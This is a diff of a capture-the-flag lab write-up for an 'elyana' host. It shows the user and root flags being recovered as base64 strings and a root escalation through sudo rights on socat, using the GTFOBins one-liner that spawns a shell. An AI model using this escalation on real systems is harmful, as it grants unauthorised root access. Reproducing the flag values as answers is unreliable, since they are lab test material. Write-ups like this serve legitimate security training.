@@ -590,15 +590,21 @@ elyana@10.10.199.13's password:
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)
 [snip ...]
 ```
-**Recovered flag** 
-* `VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259`.
-* Decoded Base64 string in CyberChef.
-    
-* Elyana user has "sudo -l" devolved privileges.
 ```
 id
 uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)
+```
+**Recover /home/elyana/user.txt**
+```
+cat /home/elyana/user.txt
+VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
+```
+* Decoded Base64 string in CyberChef.
 
+### Escalate privileges to root
+#### Sudo abuse method
+* Elyana user has delegated privileges on "/usr/bin/socat".
+```
 sudo -l
 Matching Defaults entries for elyana on elyana:
     env_reset, mail_badpass,
@@ -607,3 +613,25 @@ Matching Defaults entries for elyana on elyana:
 User elyana may run the following commands on elyana:
     (ALL) NOPASSWD: /usr/bin/socat
 ```
+* Checked [GTFOBins](https://gtfobins.github.io/gtfobins/socat/#sudo) for information on how a user with sudo rights on socat can abuse it.
+> Sudo. If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. The resulting shell is not a proper TTY shell and lacks the prompt. `sudo socat stdin exec:/bin/sh`.
+```
+-bash-4.4$ sudo socat stdin exec:/bin/sh
+whoami
+root
+```
+**Find root.txt**
+```
+find / -name root.txt 2>/dev/null
+/root/root.txt
+```
+**Recover root.txt**
+```
+cat /root/root.txt
+VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
+```
+**Decode base64**
+```
+cat /root/root.txt | base64 -d
+```
+#### Enumerate target host using LinPEAS
